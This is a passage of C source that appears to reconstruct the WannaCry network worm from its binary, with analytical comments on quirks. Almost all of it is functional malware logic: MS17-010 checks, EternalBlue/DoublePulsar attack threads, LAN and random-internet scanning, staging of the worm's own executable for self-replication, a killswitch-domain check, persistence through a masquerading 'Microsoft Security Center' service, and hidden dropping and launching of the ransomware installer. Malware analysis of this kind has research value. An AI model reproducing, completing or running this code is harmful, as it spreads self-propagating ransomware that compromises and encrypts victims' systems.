        int i, j, k;
        for (i = 1; i < out24->n; i++) {                 /* insertion sort */
            DWORD key = out24->d[i];
            for (j = i - 1; j >= 0 && out24->d[j] > key; j--)
                out24->d[j + 1] = out24->d[j];
            out24->d[j + 1] = key;
        }
        for (i = k = 0; i < out24->n; i++)               /* unique         */
            if (k == 0 || out24->d[k - 1] != out24->d[i])
                out24->d[k++] = out24->d[i];
        out24->n = k;
    }
    return 1;
}

/* =========================================================================
 * 5. Attack threads
 * ========================================================================= */

/* Per-victim kill chain: fingerprint for MS17-010, then up to ATTACK_ATTEMPTS
 * rounds of (sleep, DoublePulsar implant ping, EternalBlue race), then a
 * final implant check — if DoublePulsar is present, inject the worm copy. */
static unsigned __stdcall attack_target_thread(void *arg)
{
    char  ip[260];
    int   i, port = PORT_SMB;
    DWORD ipn = (DWORD)(uintptr_t)arg;

    strncpy(ip, inet_ntoa(*(struct in_addr *)&ipn), 0x10);
    ip[0x10] = 0;

    if (ms17_010_check(ip, port)) {
        for (i = 0; i < ATTACK_ATTEMPTS; i++) {
            Sleep(3000);
            if (doublepulsar_ping(ip, 1, port))       /* already implanted */
                break;
            Sleep(3000);
            eternalblue_race(ip, port);
        }
    }
    Sleep(3000);
    if (doublepulsar_ping(ip, 1, port))               /* implant present?  */
        inject_payload(ip, 1, port);                  /* -> worm copy      */
    _endthreadex(0);
    return 0;
}

/* LAN-lane worker: if 445 is open, spawn the attack thread and enforce a
 * 10-minute watchdog (TerminateThread on timeout), then release the
 * concurrency gate. */
static unsigned __stdcall probe_and_attack(void *arg)
{
    HANDLE h;

    if (probe_445((DWORD)(uintptr_t)arg) > 0) {
        h = (HANDLE)_beginthreadex(NULL, 0, attack_target_thread, arg, 0, NULL);
        if (h) {
            if (WaitForSingleObject(h, 600000) == WAIT_TIMEOUT)   /* 10 min */
                TerminateThread(h, 0);
            CloseHandle(h);
        }
    }
    InterlockedDecrement(&g_live_attacks);
    _endthreadex(0);
    return 0;
}

/* LAN spread lane: sweep every /24 harvested from the local adapters, keeping
 * at most SUBNET_CONCURRENCY_MAX attacks in flight (gated on g_live_attacks)
 * and pacing spawns 50 ms apart. */
static unsigned __stdcall subnet_scanner_thread(void *arg)
{
    VEC  v = { 0, 0, 0 };
    int  i;

    (void)arg;
    build_local_subnet_targets(&v);
    for (i = 0; i < v.n; i++) {
        while (g_live_attacks > SUBNET_CONCURRENCY_MAX)
            Sleep(100);
        {
            HANDLE h = (HANDLE)_beginthreadex(NULL, 0, probe_and_attack,
                                              (void *)(uintptr_t)v.d[i], 0, NULL);
            if (h) {
                InterlockedIncrement(&g_live_attacks);
                CloseHandle(h);
            }
        }
        Sleep(50);
    }
    LocalFree(v.d);
    _endthreadex(0);
    return 0;
}

/* Random-internet-IP scanner lane (arg = thread index 0..127). Each thread
 * generates random a.b.c.d probes; on a hit it sweeps the whole a.b.c.1-254
 * /24, spawning an attack thread per open host under an inline 1-hour
 * watchdog. Octets a/b are re-rolled only by threads with index < 32 and
 * only after the 40-/20-minute windows since the last hit elapse; a must be
 * != 127 (loopback) and < 224 (reserved/multicast). Two as-built quirks,
 * verified in the binary and kept here:
 *   - indices >= 32 never (re)generate a/b: their sprintf output is built
 *     from stale stack values and generally fails inet_addr (INADDR_NONE),
 *     so those threads spin on failed probes — only the first 32 effectively
 *     randomize.
 *   - t0 resets whenever a /24 sweep completes, so the 40/20-minute windows
 *     are "re-enable re-rolling" timers, not a shutdown phase. */
static unsigned __stdcall random_ip_scanner_thread(void *arg)
{
    int   idx      = (int)(uintptr_t)arg;
    int   roll_a   = 1, roll_b = 1;             /* re-roll flags for octets a/b */
    DWORD t0       = GetTickCount();
    unsigned a = 0, b = 0, c, d;

    srand((unsigned)(uintptr_t)GetCurrentThread() + GetTickCount() +
          GetCurrentThreadId() + (unsigned)time(NULL));

    for (;;) {
        if (GetTickCount() - t0 > 2400000u)     /* 40 min since last hit     */
            roll_a = 1;
        if (GetTickCount() - t0 > 1200000u)     /* 20 min since last hit     */
            roll_b = 1;

        if (roll_a && idx < RANDOM_IDX_OCTET_LIMIT) {
            a = (unsigned)rng32() % 255;
            if (a == 127 || a >= FIRST_OCTET_MAX)
                continue;                       /* retry from loop top      */
        }
        if (roll_b && idx < RANDOM_IDX_OCTET_LIMIT) {
            b = (unsigned)rng32() % 255;
        }
        c = (unsigned)rng32() % 255;            /* fresh c,d every iteration */
        d = (unsigned)rng32() % 255;

        {
            char  sip[260];
            DWORD dip;
            sprintf(sip, "%u.%u.%u.%u", a, b, c, d);
            dip = inet_addr(sip);
            if (probe_445(dip) > 0) {
                int j;
                roll_a = roll_b = 0;
                t0 = GetTickCount();
                for (j = 1; j < 255; j++) {                    /* /24 sweep */
                    DWORD  t;
                    HANDLE h;
                    sprintf(sip, "%u.%u.%u.%u", a, b, c, j);
                    t = inet_addr(sip);
                    if (probe_445(t) > 0) {
                        h = (HANDLE)_beginthreadex(NULL, 0, attack_target_thread,
                                                   (void *)(uintptr_t)t, 0, NULL);
                        if (h) {
                            if (WaitForSingleObject(h, 3600000) == WAIT_TIMEOUT)
                                TerminateThread(h, 0);          /* 1-h watchdog */
                            CloseHandle(h);
                        }
                    }
                    Sleep(50);                                   /* 50 ms */
                }
            }
        }
        Sleep(100);
    }
    /* not reached */
}

/* Assemble the two injection buffers delivered to victims:
 *   buffer 0 (x86): 16,480-B DoublePulsar user-mode loader + [4-B size][own EXE]
 *   buffer 1 (x64): 51,364-B loader + the same [size][EXE] tail
 * On the victim the DoublePulsar loader writes the appended EXE to
 * C:\WINDOWS\mssecsvc.exe and starts its service — the network worm installs
 * a copy of itself, closing the self-replication loop. */
static int stage_injection_payloads(void)
{
    HANDLE hFile;
    DWORD  fsize = 0, rd = 0;
    int    i;

    g_dp_payload[0] = GlobalAlloc(GPTR, 0x50d800);   /* 5,300,480 B each  */
    if (!g_dp_payload[0]) return 0;
    g_dp_payload[1] = GlobalAlloc(GPTR, 0x50d800);
    if (!g_dp_payload[1]) { GlobalFree(g_dp_payload[0]); return 0; }

    /* copy in the two DoublePulsar loader blobs (x86, then x64) */
    memcpy(g_dp_payload[0], g_dp_loader_x86, 0x4060);
    memcpy(g_dp_payload[1], g_dp_loader_x64, 0xc8a4);

    hFile = CreateFileA(g_own_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        GlobalFree(g_dp_payload[0]); GlobalFree(g_dp_payload[1]);
        return 0;
    }
    fsize = GetFileSize(hFile, NULL);
    if (ReadFile(hFile, (BYTE *)g_dp_payload[0] + 0x4060 + 4, fsize, &rd, NULL) &&
        rd == fsize) {
        *(DWORD *)((BYTE *)g_dp_payload[0] + 0x4060) = fsize;      /* 4-B size header */
        memcpy((BYTE *)g_dp_payload[1] + 0xc8a4,                /* mirror [size][EXE] */
               (BYTE *)g_dp_payload[0] + 0x4060, fsize + 4);    /* into the x64 buffer */
    } else {
        CloseHandle(hFile);
        GlobalFree(g_dp_payload[0]); GlobalFree(g_dp_payload[1]);
        return 0;
    }
    CloseHandle(hFile);
    (void)i;
    return 1;
}

/* CryptoAPI RNG bootstrap: acquire a PROV_RSA_FULL context (retrying once
 * with the explicit base provider name), then init the RNG critical
 * section. */
static void crypto_rng_init(void)
{
    int retry = 0;
    do {
        if (CryptAcquireContextA(&g_hprov, NULL,
                                 retry ? "Microsoft Base Cryptographic Provider v1.0" : NULL,
                                 PROV_RSA_FULL, 0xf0000000u))
            break;
    } while (++retry < 2);
    InitializeCriticalSection(&g_rng_cs);
}

/* Spreader bootstrap: Winsock 2.2 up, RNG acquired, injection buffers staged. */
static int spreader_init(void)
{
    WSADATA wsa;
    if (WSAStartup(0x0202, &wsa) != 0)
        return 0;
    crypto_rng_init();
    return stage_injection_payloads();
}

/* Launch the spreader: one LAN-lane scanner thread plus 128 random-IP
 * threads, each spawned 2 s apart with its index (0..127) as the argument. */
static void start_spreader(void)
{
    HANDLE h;
    int    i;

    if (spreader_init() == 0)
        return;
    h = (HANDLE)_beginthreadex(NULL, 0, subnet_scanner_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    for (i = 0; i < RANDOM_THREADS; i++) {
        h = (HANDLE)_beginthreadex(NULL, 0, random_ip_scanner_thread,
                                   (void *)(uintptr_t)i, 0, NULL);
        if (h) CloseHandle(h);
        Sleep(2000);
    }
}

/* =========================================================================
 * 6. Killswitch / service / payload drop
 * ========================================================================= */

/* The program's real main. Killswitch: at startup the network worm contacts a
 * hardcoded domain; if the domain answers at all — any HTTP response, from
 * a proxy, captive portal or sinkhole counts — the worm exits without
 * infecting. If the domain is unreachable, infection proceeds. The original
 * outbreak was famously halted when researchers registered the domain and
 * sinkholed it. */
static int check_killswitch_domain(void)
{
    char   url[64];
    HANDLE hinet, hurl;

    strcpy(url, KILLSWITCH_URL);                    /* copy the killswitch URL */
    hinet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hurl  = InternetOpenUrlA(hinet, url, NULL, 0,
                             INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
                             0);
    if (hurl != NULL) {                             /* answered -> dormant   */
        InternetCloseHandle(hinet);
        InternetCloseHandle(hurl);
        return 0;
    }
    InternetCloseHandle(hinet);
    InternetCloseHandle(NULL);                      /* quirk kept: NULL close */
    dispatch_by_args();
    return 0;
}

/* Failure-restart policy (SERVICE_CONFIG_FAILURE_ACTIONS): if the service
 * crashes, the SCM restarts it automatically after `wait_s` seconds —
 * resilience on top of auto-start. Called with 60 from dispatch_by_args. */
static void config_service_failure_actions(SC_HANDLE hsvc, int wait_s)
{
    SERVICE_FAILURE_ACTIONS sfa;
    SC_ACTION               act;

    memset(&sfa, 0, sizeof(sfa));
    act.Type  = (wait_s != -1) ? SC_ACTION_RESTART : SC_ACTION_NONE;
    act.Delay = (DWORD)wait_s * 1000;
    sfa.dwResetPeriod = 1;
    sfa.lpRebootMsg   = g_empty_str;
    sfa.lpCommand     = g_empty_str;
    sfa.cActions      = 1;
    sfa.lpsaActions   = &act;
    ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
}

/* Persistence: create + start the masquerading auto-start service. Registers
 * under the fixed service name with the fake "Microsoft Security Center
 * (2.0)" display name and SERVICE_AUTO_START (relaunched at every boot,
 * ImagePath "<path> -m security" = spreader mode), then starts it now. */
static void service_install(void)
{
    char       cmdline[260];
    SC_HANDLE  scm, svc;

    sprintf(cmdline, SERVICE_ARGS_FMT, g_own_path);         /* "%s -m security" */
    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
        return;
    svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
                         SERVICE_ALL_ACCESS,
                         SERVICE_WIN32_OWN_PROCESS,
                         SERVICE_AUTO_START,
                         SERVICE_ERROR_NORMAL,
                         cmdline, NULL, NULL, NULL, NULL, NULL);
    if (svc) {
        StartServiceA(svc, 0, NULL);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

/* Payload drop chain: extract the embedded ransomware installer (custom
 * resource "R", ID 1831), move any previous C:\WINDOWS\tasksche.exe aside to
 * the junk name "qeriuwjhrf", write the fresh copy, and launch
 * "C:\WINDOWS\tasksche.exe /i" hidden (CREATE_NO_WINDOW). The four kernel32
 * file/process APIs are resolved via GetProcAddress at runtime to keep them
 * out of the import table. */
static void drop_payload_from_resource(void)
{
    HMODULE    k32;
    HRSRC      hr;
    HGLOBAL    hg;
    LPVOID     res;
    DWORD      rsize;
    char       tpath[260], qpath[260], cmdline[270];
    HANDLE     hf;
    PROCESS_INFORMATION pi;
    STARTUPINFOA       si;

    k32 = GetModuleHandleW(L"kernel32.dll");
    if (!k32)
        return;
    g_fn_create_process.proc = GetProcAddress(k32, "CreateProcessA");
    g_fn_create_file.proc    = GetProcAddress(k32, "CreateFileA");
    g_fn_write_file.proc     = GetProcAddress(k32, "WriteFile");
    g_fn_close_handle.proc   = GetProcAddress(k32, "CloseHandle");
    if (!g_fn_create_process.proc || !g_fn_create_file.proc ||
        !g_fn_write_file.proc  || !g_fn_close_handle.proc)
        return;

    hr = FindResourceA(NULL, MAKEINTRESOURCEA(RESOURCE_ID), RESOURCE_TYPE);
    if (!hr)
        return;
    hg = LoadResource(NULL, hr);
    if (!hg)
        return;
    res = LockResource(hg);
    if (!res)
        return;
    rsize = SizeofResource(NULL, hr);
    if (!rsize)
        return;

    sprintf(tpath, "C:\\%s\\%s", DROP_DIR, DROP_NAME);           /* C:\WINDOWS\tasksche.exe */
    sprintf(qpath, "C:\\%s\\%s", DROP_DIR, OLD_PAYLOAD_NAME);    /* C:\WINDOWS\qeriuwjhrf   */
    MoveFileExA(tpath, qpath, MOVEFILE_REPLACE_EXISTING);        /* previous copy aside */

    hf = g_fn_create_file.create_file(tpath, GENERIC_WRITE, 0,
                                      NULL, CREATE_ALWAYS, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE)
        return;
    {
        DWORD w = 0;
        g_fn_write_file.write_file((HANDLE)hf, res, rsize, &w, NULL);
        g_fn_close_handle.close_handle((HANDLE)hf);
    }

    sprintf(cmdline, "%s%s", tpath, DROP_ARGS);
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    if (g_fn_create_process.create_process(NULL, cmdline, NULL, NULL, FALSE,
                                           CREATE_NO_WINDOW,
                                           NULL, NULL, &si, &pi)) {
        g_fn_close_handle.close_handle(pi.hThread);
        g_fn_close_handle.close_handle(pi.hProcess);
    }
}

/* First-run path (no command-line arguments): install the service and
 * drop/launch the payload. */
static void install_service_and_drop_payload(void)
{
    service_install();
    drop_payload_from_resource();
}

/* Argument dispatcher. No arguments = fresh manual run: install the service
 * and drop the payload. With arguments (the SCM runs "<path> -m security"):
 * re-arm the 60 s failure-restart policy, then enter the service
 * dispatcher, which invokes service_main. */
static void dispatch_by_args(void)
{
    SC_HANDLE scm, svc;
    SERVICE_TABLE_ENTRYA ste[2];

    GetModuleFileNameA(NULL, g_own_path, 0x104);
    if (*__p___argc() < 2) {
        install_service_and_drop_payload();
        return;
    }
    /* service mode ("mssecsvc.exe -m security" from the SCM) */
    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
        if (svc) {
            config_service_failure_actions(svc, 60);   /* restart in 60 s   */
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    ste[0].lpServiceName = (LPSTR)SERVICE_NAME;
    ste[0].lpServiceProc = service_main;
    ste[1].lpServiceName = NULL;
    ste[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcherA(ste);
}

/* Service control handler: STOP/SHUTDOWN -> STOPPED, PAUSE -> paused,
 * CONTINUE -> running. Pure status bookkeeping — the spreader threads are
 * never cleaned up. */
static void WINAPI service_handler(DWORD ctrl)
{
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_sstat.dwCurrentState  = SERVICE_STOPPED;
        g_sstat.dwWin32ExitCode = 0;
        g_sstat.dwCheckPoint    = 0;
        g_sstat.dwWaitHint      = 0;
        break;
    case SERVICE_CONTROL_PAUSE:
        g_sstat.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        g_sstat.dwCurrentState = SERVICE_RUNNING;
        break;
    default:
        break;
    }
    SetServiceStatus(g_ssh, &g_sstat);
}

/* ServiceMain: register the control handler, report RUNNING, launch the
 * spreader, then sleep 24 h and exit — the 60 s failure-restart policy
 * revives the service if it dies or is killed. */
static void WINAPI service_main(DWORD argc, LPSTR *argv)
{
    (void)argc; (void)argv;
    g_sstat.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_sstat.dwCurrentState            = SERVICE_START_PENDING;
    g_sstat.dwControlsAccepted        = SERVICE_ACCEPT_STOP;
    g_sstat.dwWin32ExitCode           = 0;
    g_sstat.dwServiceSpecificExitCode = 0;
    g_sstat.dwCheckPoint              = 0;
    g_sstat.dwWaitHint                = 0;

    g_ssh = RegisterServiceCtrlHandlerA(SERVICE_NAME, service_handler);
    if (!g_ssh)
        return;
    g_sstat.dwCurrentState = SERVICE_RUNNING;
    g_sstat.dwCheckPoint   = 0;
    g_sstat.dwWaitHint     = 0;
    SetServiceStatus(g_ssh, &g_sstat);

    start_spreader();                                /* threads + payloads   */
    Sleep(WORM_LIFETIME);                            /* 86,400,000 ms = 24 h */
    ExitProcess(1);
}

/* Entry point: the CRT calls this as main. It runs the killswitch check,
 * which either returns immediately (domain answered -> exit) or drives the
 * install/spread flow via dispatch_by_args. */
int main(void)
{
    return check_killswitch_domain();
}
